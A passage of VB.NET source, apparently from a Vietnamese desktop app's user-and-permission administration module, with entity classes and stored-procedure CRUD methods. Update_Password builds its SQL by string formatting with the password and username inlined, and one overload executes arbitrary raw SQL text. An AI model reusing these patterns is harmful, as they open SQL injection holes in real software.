Imports System.Data
Imports System.Data.SqlClient

Public Class clsHeThong
    Private _SqlHelper As DBAccess

    Public Sub New()
        _SqlHelper = New DBAccess()
    End Sub

#Region "---> Khai báo thuộc tính và khởi tạo đối tượng <---"
    'Khai báo thuộc tính và khởi tạo đối tượng - Nhóm Thành viên
    Public Class GroupMember
        Private _ma_nhom As String
        Private _ten_nhom As String
        Private _ghi_chu As String
        Private _ngay_tao As DateTime

        Public Sub New()
            _ma_nhom = ""
            _ten_nhom = ""
            _ghi_chu = ""
            _ngay_tao = DateTime.Now
        End Sub

        Public Property ma_nhom() As String
            Get
                Return _ma_nhom
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 32) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị mã hiệu nhóm có độ dài không hợp lệ!", value, value.ToString())
                End If
                _ma_nhom = value
            End Set
        End Property

        Public Property ten_nhom() As String
            Get
                Return _ten_nhom
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 128) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị tên nhóm có độ dài không hợp lệ!", value, value.ToString())
                End If
                _ten_nhom = value
            End Set
        End Property

        Public Property ghi_chu() As String
            Get
                Return _ghi_chu
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 512) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị ghi chú có độ dài không hợp lệ!", value, value.ToString())
                End If
                _ghi_chu = value
            End Set
        End Property

        Public Property ngay_tao() As DateTime
            Get
                Return _ngay_tao
            End Get
            Set(ByVal value As DateTime)
                _ngay_tao = value
            End Set
        End Property
    End Class

    'Khai báo thuộc tính và khởi tạo đối tượng - Danh sách Thành viên
    Public Class Members
        Private _id_nhom As String
        Private _ten_tv As String
        Private _mat_khau As String
        Private _ho_ten As String
        Private _email As String
        Private _ngay_sua As DateTime
        Private _ngay_tao As DateTime
        Private _ghi_chu As String

        Public Sub New()
            _id_nhom = ""
            _ten_tv = ""
            _mat_khau = ""
            _ho_ten = ""
            _email = ""
            _ngay_sua = DateTime.Now
            _ngay_tao = DateTime.Now
            _ghi_chu = ""
        End Sub

        Public Property id_nhom() As String
            Get
                Return _id_nhom
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 32) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị mã hiệu nhóm thành viên có độ dài không hợp lệ!", value, value.ToString())
                End If
                _id_nhom = value
            End Set
        End Property

        Public Property ten_tv() As String
            Get
                Return _ten_tv
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 16) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị tên thành viên có độ dài không hợp lệ!", value, value.ToString())
                End If
                _ten_tv = value
            End Set
        End Property

        Public Property mat_khau() As String
            Get
                Return _mat_khau
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 512) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị mật khẩu có độ dài không hợp lệ!", value, value.ToString())
                End If
                _mat_khau = value
            End Set
        End Property

        Public Property ho_ten() As String
            Get
                Return _ho_ten
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 128) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị họ tên thành viên có độ dài không hợp lệ!", value, value.ToString())
                End If
                _ho_ten = value
            End Set
        End Property

        Public Property email() As String
            Get
                Return _email
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 256) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị địa chỉ e-mail có độ dài không hợp lệ!", value, value.ToString())
                End If
                _email = value
            End Set
        End Property

        Public Property ngay_sua() As DateTime
            Get
                Return _ngay_sua
            End Get
            Set(ByVal value As DateTime)
                _ngay_sua = value
            End Set
        End Property

        Public Property ngay_tao() As DateTime
            Get
                Return _ngay_tao
            End Get
            Set(ByVal value As DateTime)
                _ngay_tao = value
            End Set
        End Property

        Public Property ghi_chu() As String
            Get
                Return _ghi_chu
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 512) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị ghi chú có độ dài không hợp lệ!", value, value.ToString())
                End If
                _ghi_chu = value
            End Set
        End Property
    End Class

    'Khai báo thuộc tính và khởi tạo đối tượng - Danh sách Tập quyền
    Public Class Permits
        Private _quyen As Int32
        Private _nhom_quyen As Int32
        Private _ten_quyen As String

        Public Sub New()
            _quyen = 0
            _nhom_quyen = 0
            _ten_quyen = ""
        End Sub

        Public Property quyen() As Int32
            Get
                Return _quyen
            End Get
            Set(ByVal value As Int32)
                _quyen = value
            End Set
        End Property

        Public Property nhom_quyen() As Int32
            Get
                Return _nhom_quyen
            End Get
            Set(ByVal value As Int32)
                _nhom_quyen = value
            End Set
        End Property

        Public Property ten_quyen() As String
            Get
                Return _ten_quyen
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 512) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị tên quyền có độ dài không hợp lệ!", value, value.ToString())
                End If
                _ten_quyen = value
            End Set
        End Property
    End Class

    'Khai báo thuộc tính và khởi tạo đối tượng - Hệ thống quyền (Liên kết giữa Tập quyền và Nhóm thành viên)
    Public Class PermitGrMember
        Private _nhom_tv As String
        Private _tap_quyen As String
        Private _ngay_tao As DateTime

        Public Sub New()
            _nhom_tv = ""
            _tap_quyen = ""
            _ngay_tao = DateTime.Now
        End Sub

        Public Property nhom_tv() As String
            Get
                Return _nhom_tv
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 32) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị mã nhóm thành viên có độ dài không hợp lệ!", value, value.ToString())
                End If
                _nhom_tv = value
            End Set
        End Property

        Public Property tap_quyen() As String
            Get
                Return _tap_quyen
            End Get
            Set(ByVal value As String)
                If Not (value Is Nothing) Then
                    If (value.Length > 1024) Then Throw New ArgumentOutOfRangeException("Chuỗi giá trị tập quyền có độ dài không hợp lệ!", value, value.ToString())
                End If
                _tap_quyen = value
            End Set
        End Property

        Public Property ngay_tao() As DateTime
            Get
                Return _ngay_tao
            End Get
            Set(ByVal value As DateTime)
                _ngay_tao = value
            End Set
        End Property
    End Class
#End Region

#Region "---> Các hàm định nghĩa lưới dữ liệu <---"
    ''' <summary>
    ''' Hàm định nghĩa lưới dữ liệu - Liên quan đến Quản trị Hệ thống
    ''' </summary>
    ''' <param name="dgv_name">Tên lưới dữ liệu</param>
    ''' <param name="state">True: Lưới dl thông tin thành viên. False: Thông tin nhóm thành viên</param>
    ''' <remarks></remarks>
    Public Sub Create_Frame(ByVal dgv_name As DataGridView, ByVal state As Boolean)
        dgv_name.AutoGenerateColumns = True
        dgv_name.Columns.Clear()
        If (state = True) Then
            Dim ckb_choice As DataGridViewCheckBoxColumn = New DataGridViewCheckBoxColumn
            ckb_choice.Name = "cln_Choice"
            ckb_choice.HeaderText = "Chọn"
            ckb_choice.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter
            ckb_choice.CellTemplate.Style.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter
            ckb_choice.Width = 45
            dgv_name.Columns.Add(ckb_choice)

            dgv_name.Columns.Add("cln_UserName", "Tên đăng nhập")
            dgv_name.Columns.Add("cln_FullName", "Họ và tên")
            dgv_name.Columns.Add("cln_Email", "Địa chỉ e-mail")
            dgv_name.Columns.Add("cln_ModifiedDate", "Ngày sửa")
            dgv_name.Columns.Add("cln_CreationDate", "Ngày tạo")
            dgv_name.Columns.Add("cln_Note", "Ghi chú")

            dgv_name.Columns(1).Width = 103
            dgv_name.Columns(2).Width = 160
            dgv_name.Columns(3).Width = 180
            dgv_name.Columns(4).Width = 90
            dgv_name.Columns(5).Width = 90
            dgv_name.Columns(6).Width = 190

            'ReadOnly columns - Không cho phép edit các Cell trên lưới dữ liệu
            dgv_name.Columns(1).ReadOnly = True
            dgv_name.Columns(2).ReadOnly = True
            dgv_name.Columns(3).ReadOnly = True
            dgv_name.Columns(4).ReadOnly = True
            dgv_name.Columns(5).ReadOnly = True
            dgv_name.Columns(6).ReadOnly = True

            'Căn chỉnh tiêu đề
            dgv_name.Columns(4).CellTemplate.Style.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter
            dgv_name.Columns(5).CellTemplate.Style.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter
        Else
            Dim ckb_choice As DataGridViewCheckBoxColumn = New DataGridViewCheckBoxColumn
            ckb_choice.Name = "cln_Choice"
            ckb_choice.HeaderText = "Chọn"
            ckb_choice.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter
            ckb_choice.CellTemplate.Style.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter
            ckb_choice.Width = 45
            dgv_name.Columns.Add(ckb_choice)

            dgv_name.Columns.Add("cln_Code", "Mã nhóm")
            dgv_name.Columns.Add("cln_Name", "Tên gọi nhóm thành viên")
            dgv_name.Columns.Add("cln_Note", "Ghi chú")
            dgv_name.Columns.Add("cln_CreationDate", "Ngày tạo")

            dgv_name.Columns(1).Width = 100
            dgv_name.Columns(2).Width = 170
            dgv_name.Columns(3).Width = 210
            dgv_name.Columns(4).Width = 85

            'ReadOnly columns - Không cho phép edit các Cell trên lưới dữ liệu
            dgv_name.Columns(1).ReadOnly = True
            dgv_name.Columns(2).ReadOnly = True
            dgv_name.Columns(3).ReadOnly = True
            dgv_name.Columns(4).ReadOnly = True

            'Căn chỉnh tiêu đề
            dgv_name.Columns(4).CellTemplate.Style.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter
        End If
    End Sub
#End Region

#Region "---> Các hàm Cập nhật dữ liệu - Hệ thống <---"
    '------->Cập nhật thông tin Nhóm thành viên<-------
    Public Sub Insert_GroupMember(ByVal obj_grmember As GroupMember)
        Dim command As SqlCommand = New SqlCommand("HT_NhomTV_Insert")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_ma_nhom", obj_grmember.ma_nhom))
        command.Parameters.Add(New SqlParameter("@_ten_nhom", obj_grmember.ten_nhom))
        command.Parameters.Add(New SqlParameter("@_ghi_chu", obj_grmember.ghi_chu))
        command.Parameters.Add(New SqlParameter("@_ngay_tao", obj_grmember.ngay_tao))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Thêm mới dữ liệu nhóm thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    Public Sub Update_GroupMember(ByVal obj_grmember As GroupMember, ByVal _Code As String)
        Dim command As SqlCommand = New SqlCommand("HT_NhomTV_Update")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_Code", SqlDbType.NVarChar))
        command.Parameters("@_Code").Value = _Code
        command.Parameters.Add(New SqlParameter("@_ma_nhom", obj_grmember.ma_nhom))
        command.Parameters.Add(New SqlParameter("@_ten_nhom", obj_grmember.ten_nhom))
        command.Parameters.Add(New SqlParameter("@_ghi_chu", obj_grmember.ghi_chu))
        command.Parameters.Add(New SqlParameter("@_ngay_tao", obj_grmember.ngay_tao))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Sửa đổi dữ liệu nhóm thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    Public Sub Delete_GroupMember(ByVal _Code As String)
        Dim command As SqlCommand = New SqlCommand("HT_NhomTV_Delete")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_ma_nhom", SqlDbType.NVarChar))
        command.Parameters("@_ma_nhom").Value = _Code
        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Xoá dữ liệu nhóm thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    '------->Cập nhật thông tin Thành viên<-------
    ''' <summary>
    ''' Hàm thực hiện - Cập nhật thêm mới thông tin Thành viên
    ''' </summary>
    ''' <param name="obj_member">Thông tin thành viên</param>
    ''' <remarks></remarks>
    Public Sub Insert_Members(ByVal obj_member As Members)
        Dim command As SqlCommand = New SqlCommand("HT_ThanhVien_Insert")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_id_nhom", obj_member.id_nhom))
        command.Parameters.Add(New SqlParameter("@_ten_tv", obj_member.ten_tv))
        command.Parameters.Add(New SqlParameter("@_mat_khau", obj_member.mat_khau))
        command.Parameters.Add(New SqlParameter("@_ho_ten", obj_member.ho_ten))
        command.Parameters.Add(New SqlParameter("@_email", obj_member.email))
        command.Parameters.Add(New SqlParameter("@_ngay_sua", obj_member.ngay_sua))
        command.Parameters.Add(New SqlParameter("@_ngay_tao", obj_member.ngay_tao))
        command.Parameters.Add(New SqlParameter("@_ghi_chu", obj_member.ghi_chu))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Thêm mới thông tin thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    ''' <summary>
    ''' Hàm thực hiện - Sửa đổi dữ liệu thông tin Thành viên
    ''' </summary>
    ''' <param name="obj_member">Thành viên</param>
    ''' <param name="_userName">Tên đăng nhập cần sửa</param>
    ''' <remarks></remarks>
    Public Sub Update_Members(ByVal obj_member As Members, ByVal _userName As String)
        Dim command As SqlCommand = New SqlCommand("HT_ThanhVien_Update")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_UserName", SqlDbType.NVarChar))
        command.Parameters("@_UserName").Value = _username

        command.Parameters.Add(New SqlParameter("@_id_nhom", obj_member.id_nhom))
        command.Parameters.Add(New SqlParameter("@_ten_tv", obj_member.ten_tv))
        command.Parameters.Add(New SqlParameter("@_mat_khau", obj_member.mat_khau))
        command.Parameters.Add(New SqlParameter("@_ho_ten", obj_member.ho_ten))
        command.Parameters.Add(New SqlParameter("@_email", obj_member.email))
        command.Parameters.Add(New SqlParameter("@_ngay_sua", obj_member.ngay_sua))
        command.Parameters.Add(New SqlParameter("@_ngay_tao", obj_member.ngay_tao))
        command.Parameters.Add(New SqlParameter("@_ghi_chu", obj_member.ghi_chu))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Sửa đổi thông tin thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    ''' <summary>
    ''' Hàm thực hiện - Xoá thông tin danh sách thành viên
    ''' </summary>
    ''' <param name="_Name">Tên đăng nhập thành viên</param>
    ''' <remarks></remarks>
    Public Sub Delete_Members(ByVal _Name As String)
        Dim command As SqlCommand = New SqlCommand("HT_ThanhVien_Delete")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_ten_tv", SqlDbType.NVarChar))
        command.Parameters("@_ten_tv").Value = _Name
        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Xoá dữ liệu thông tin thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    ''' <summary>
    ''' Hàm thực hiện - Cập nhật đổi mật khẩu Thành viên
    ''' </summary>
    ''' <param name="_userName">Tên đăng nhập</param>
    ''' <param name="_passWord">Mật khẩu mới</param>
    ''' <remarks></remarks>
    Public Sub Update_Password(ByVal _userName As String, ByVal _passWord As String)
        Dim strSQL As String = String.Format("Update HS_CanBo Set login_password = '{0}' Where login_username = '{1}' And idDonVi = {2}", _passWord, gUsername, IdDONVI)
        Dim command As SqlCommand = New SqlCommand(strSQL)
        command.CommandType = CommandType.Text
        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Cập nhật đổi mật khẩu thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    '------->Cập nhật thông tin Tập Quyền<-------
    ''' <summary>
    ''' Hàm thực hiện - Cập nhật thêm mới Thông tin Tập quyền
    ''' </summary>
    ''' <param name="obj_permit">Tập quyền</param>
    ''' <remarks></remarks>
    Public Sub Insert_Permits(ByVal obj_permit As Permits)
        Dim command As SqlCommand = New SqlCommand("HT_TapQuyen_Insert")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_nhom_quyen", obj_permit.nhom_quyen))
        command.Parameters.Add(New SqlParameter("@_ten_quyen", obj_permit.ten_quyen))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Thêm mới dữ liệu tập quyền: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    ''' <summary>
    ''' Hàm thực hiện - Cập nhật sửa đổi Thông tin Tập quyền
    ''' </summary>
    ''' <param name="obj_permit">Tập quyền</param>
    ''' <remarks></remarks>
    Public Sub Update_Permits(ByVal obj_permit As Permits)
        Dim command As SqlCommand = New SqlCommand("HT_TapQuyen_Update")
        command.CommandType = CommandType.StoredProcedure
        command.Parameters.Add(New SqlParameter("@_quyen", obj_permit.quyen))
        command.Parameters.Add(New SqlParameter("@_nhom_quyen", obj_permit.nhom_quyen))
        command.Parameters.Add(New SqlParameter("@_ten_quyen", obj_permit.ten_quyen))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Sửa đổi dữ liệu tập quyền: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    ''' <summary>
    ''' Hàm thực hiện - Cập nhật Xoá bỏ Thông tin Tập quyền
    ''' </summary>
    ''' <param name="_Id">Chỉ số xác định tập quyền</param>
    ''' <remarks></remarks>
    Public Sub Delete_Permits(ByVal _Id As Int32)
        Dim command As SqlCommand = New SqlCommand("HT_TapQuyen_Delete")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_quyen", SqlDbType.Int))
        command.Parameters("@_quyen").Value = _Id
        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Xoá dữ liệu tập quyền: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    '------->Cập nhật thông tin Quyền của Nhóm Thành viên<-------

    ''' <summary>
    ''' Hàm thực hiện - Cập nhật Thêm mới thông tin Quyền của nhóm thành viên
    ''' </summary>
    ''' <param name="obj_pergroup">Quyền nhóm thành viên</param>
    ''' <remarks></remarks>
    Public Sub Insert_PermitGrMember(ByVal obj_pergroup As PermitGrMember)
        Dim command As SqlCommand = New SqlCommand("HT_Quyen_Insert")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_nhom_tv", obj_pergroup.nhom_tv))
        command.Parameters.Add(New SqlParameter("@_tap_quyen", obj_pergroup.tap_quyen))
        command.Parameters.Add(New SqlParameter("@_ngay_tao", obj_pergroup.ngay_tao))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Thêm mới dữ liệu quyền nhóm thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    ''' <summary>
    ''' Hàm thực hiện - Cập nhật Sửa đổi thông tin Quyền của nhóm thành viên
    ''' </summary>
    ''' <param name="obj_pergroup">Quyền nhóm thành viên</param>
    ''' <remarks></remarks>
    Public Sub Update_PermitGrMember(ByVal obj_pergroup As PermitGrMember)
        Dim command As SqlCommand = New SqlCommand("HT_Quyen_Update")
        command.CommandType = CommandType.StoredProcedure

        command.Parameters.Add(New SqlParameter("@_nhom_tv", obj_pergroup.nhom_tv))
        command.Parameters.Add(New SqlParameter("@_tap_quyen", obj_pergroup.tap_quyen))
        command.Parameters.Add(New SqlParameter("@_ngay_tao", obj_pergroup.ngay_tao))

        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Sửa đổi dữ liệu tập quyền nhóm thành viên: " + ex.Message.ToString(), "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

    Public Sub Update_PermitGrMember(ByVal strSQL As String)
        Dim command As System.Data.SqlClient.SqlCommand = New System.Data.SqlClient.SqlCommand(strSQL)
        command.CommandType = CommandType.Text
        Try
            _SqlHelper.executeSQL(command)
        Catch ex As Exception
            MessageBox.Show("Cập nhật dữ liệu tập quyền nhóm thành viên: " + ex.Message.ToString(), "Error...", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button3)
        End Try
    End Sub

#End Region

#Region "---> Các hàm Lấy dữ liệu - Hệ thống <---"
    ''' <summary>
    ''' Hàm thực hiện - Fill dữ liệu vào treeview danh sách thành viên
    ''' </summary>
    ''' <param name="tv_name">Tên cây dữ liệu cần fill vào</param>
    ''' <remarks></remarks>
    Public Sub Fill_Data(ByVal tv_name As TreeView)
        tv_name.Nodes.Clear()
        Dim tn_parent As TreeNode
        Dim tn_child As TreeNode
        Dim strSQL As String = ""
        If Globals.Group = "Admin" Then
            strSQL = String.Format("Select ma_nhom,ten_nhom From HT_NhomTV Order by Ngay_tao Asc")
        Else
            strSQL = String.Format("SELECT ma_nhom,ten_nhom FROM HT_NhomTV WHERE ma_nhom<>'Admin' Order by Ngay_tao Asc")
        End If
        Using db As DataTable = _SqlHelper.SelectDBRows(strSQL)
            If Not (db Is Nothing) Then
                If (db.Rows.Count > 0) Then
                    For i As Integer = 0 To db.Rows.Count - 1
                        tn_parent = tv_name.Nodes.Add(db.Rows(i)("ten_nhom").ToString())
                        tn_parent.Tag = "00_" + db.Rows(i)("ma_nhom").ToString().Trim()
                        'strSQL = String.Format(" Select ten_tv,ho_ten From HT_ThanhVien Where id_nhom = '{0}'", db.Rows(i)("ma_nhom").ToString().Trim())
                        'Using db_child As DataTable = _SqlHelper.SelectDBRows(strSQL)
                        '    If Not (db_child Is Nothing) Then
                        '        If (db_child.Rows.Count > 0) Then
                        '            For j As Integer = 0 To (db_child.Rows.Count - 1)
                        '                tn_child = tn_parent.Nodes.Add(db_child.Rows(j)("ho_ten").ToString())
                        '                tn_child.Tag = "01_" + db_child.Rows(j)("ten_tv").ToString().Trim()
                        '            Next
                        '        End If
                        '    End If
                        'End Using
                    Next
                End If
            End If
        End Using
    End Sub

    ''' <summary>
    ''' Hàm thực hiện - Trả về danh sách thành viên theo Nhóm thành viên
    ''' </summary>
    ''' <param name="_Code">Mã nhóm thành viên</param>
    ''' <returns>Danh sách thành viên thoả mãn</returns>
    ''' <remarks></remarks>
    Public Function GetAll_Members(ByVal _Code As String) As DataTable
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If
        Try
            Dim command As SqlCommand = New SqlCommand("HT_ThanhVien_GetForIdGroup", connection)
            command.CommandType = CommandType.StoredProcedure

            command.Parameters.Add(New SqlParameter("@_id_nhom", SqlDbType.NVarChar))
            command.Parameters("@_id_nhom").Value = _Code

            Using mydap As SqlDataAdapter = New SqlDataAdapter(command)
                Dim ds As DataSet = New DataSet
                mydap.Fill(ds, "HS_ThanhVien")
                If (ds Is Nothing Or ds.Tables.Count = 0 Or ds.Tables(0).Rows.Count = 0) Then
                    Return Nothing
                End If
                Return ds.Tables("HS_ThanhVien")
            End Using
        Catch ex As Exception
            Throw ex
        Finally
            If (connection.State = System.Data.ConnectionState.Open) Then
                connection.Close()
            End If
        End Try
        Return Nothing
    End Function

    ''' <summary>
    ''' Hàm thực hiện - Trả về record thành viên theo tên thành viên truyền vào
    ''' </summary>
    ''' <param name="_UserName">Tên thành viên truyền vào</param>
    ''' <returns>Bản ghi cần lấy</returns>
    ''' <remarks></remarks>
    Public Function GetMember(ByVal _UserName As String) As DataRow
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If
        Try
            Dim command As SqlCommand = New SqlCommand("HT_ThanhVien_GetForId", connection)
            command.CommandType = CommandType.StoredProcedure

            command.Parameters.Add(New SqlParameter("@_ten_tv", SqlDbType.NVarChar))
            command.Parameters("@_ten_tv").Value = _UserName

            Using mydap As SqlDataAdapter = New SqlDataAdapter(command)
                Dim ds As DataSet = New DataSet
                mydap.Fill(ds, "HS_Member")
                If (ds Is Nothing Or ds.Tables.Count = 0 Or ds.Tables(0).Rows.Count = 0) Then
                    Return Nothing
                End If
                Return ds.Tables("HS_Member").Rows(0)
            End Using
            connection.Close()
        Finally
            If (connection.State = System.Data.ConnectionState.Open) Then connection.Close()
        End Try
    End Function

    ''' <summary>
    ''' Hàm thực hiện - Trả về danh sách Nhóm thành viên
    ''' </summary>
    ''' <returns>Danh sách nhóm thành viên</returns>
    ''' <remarks></remarks>
    Public Function GetAll_GroupMembers() As DataTable
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If
        Try
            Dim command As SqlCommand = New SqlCommand("HT_NhomTV_GetAll", connection)
            command.CommandType = CommandType.StoredProcedure

            Using mydap As SqlDataAdapter = New SqlDataAdapter(command)
                Dim ds As DataSet = New DataSet
                mydap.Fill(ds, "HS_GroupMembers")
                If (ds Is Nothing Or ds.Tables.Count = 0 Or ds.Tables(0).Rows.Count = 0) Then
                    Return Nothing
                End If
                Return ds.Tables("HS_GroupMembers")
            End Using
        Catch ex As Exception
            Throw ex
        Finally
            If (connection.State = System.Data.ConnectionState.Open) Then
                connection.Close()
            End If
        End Try
        Return Nothing
    End Function

    ''' <summary>
    ''' Hàm thực hiện - Trả về record group member theo code truyền vào
    ''' </summary>
    ''' <param name="_Code">Mã nhóm truyền vào</param>
    ''' <returns>Bản ghi cần trả về</returns>
    ''' <remarks></remarks>
    Public Function GetGroupMember(ByVal _Code As String) As DataRow
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If
        Try
            Dim command As SqlCommand = New SqlCommand("HT_NhomTV_GetForId", connection)
            command.CommandType = CommandType.StoredProcedure

            command.Parameters.Add(New SqlParameter("@_ma_nhom", SqlDbType.NVarChar))
            command.Parameters("@_ma_nhom").Value = _Code

            Using mydap As SqlDataAdapter = New SqlDataAdapter(command)
                Dim ds As DataSet = New DataSet
                mydap.Fill(ds, "HS_GroupMember")
                If (ds Is Nothing Or ds.Tables.Count = 0 Or ds.Tables(0).Rows.Count = 0) Then
                    Return Nothing
                End If
                Return ds.Tables("HS_GroupMember").Rows(0)
            End Using
        Finally
            If (connection.State = System.Data.ConnectionState.Open) Then connection.Close()
        End Try
    End Function

    ''' <summary>
    ''' Hàm thực hiện trả về danh sách tập quyền theo id nhóm quyền truyền vào
    ''' </summary>
    ''' <param name="_GrPermitId">Id nhóm quyền</param>
    ''' <returns>Danh sách tập quyền</returns>
    ''' <remarks></remarks>
    Public Function GetAll_Permits(ByVal _GrPermitId As Int32) As DataTable
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If
        Try
            Dim command As SqlCommand
            If DONVI = gMaDonViTW Then ' Đối với administrator tại TW thì được phép thêm, sửa, xoá hệ thống danh mục
                command = New SqlCommand("HT_TapQuyen_GetAll", connection)
            Else                    ' Đối với administrator tại chi nhánh tỉnh hoặc tương đương thì không được phép thêm, sửa, xoá hệ thống danh mục
                command = New SqlCommand("HT_TapQuyen_notROOT_GetAll", connection)
            End If
            command.CommandType = CommandType.StoredProcedure
            command.Parameters.Add(New SqlParameter("@_nhom_quyen", SqlDbType.Int))
            command.Parameters("@_nhom_quyen").Value = _GrPermitId

            Using mydap As SqlDataAdapter = New SqlDataAdapter(command)
                Dim ds As DataSet = New DataSet
                mydap.Fill(ds, "HS_TapQuyen")
                If (ds Is Nothing Or ds.Tables.Count = 0 Or ds.Tables(0).Rows.Count = 0) Then
                    Return Nothing
                End If
                Return ds.Tables("HS_TapQuyen")
            End Using
        Catch ex As Exception
            Throw ex
        Finally
            If (connection.State = System.Data.ConnectionState.Open) Then
                connection.Close()
            End If
        End Try
        Return Nothing
    End Function

    ''' <summary>
